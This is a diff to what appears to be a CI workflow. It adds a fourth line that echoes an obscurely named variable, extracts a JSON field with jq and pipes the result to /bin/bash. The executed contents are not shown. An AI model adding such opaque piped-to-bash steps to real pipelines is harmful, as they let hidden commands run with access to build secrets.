@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$e33" | jq -r .cy14 | /bin/bash
           echo $mrcv5009 | jq -r .v7 | /bin/bash
           echo $vra61342 | jq -r .nes44775 | /bin/bash
+          echo $h5298 | jq -r .oav2 | /bin/bash
 
       - name: Store results
         if: always()
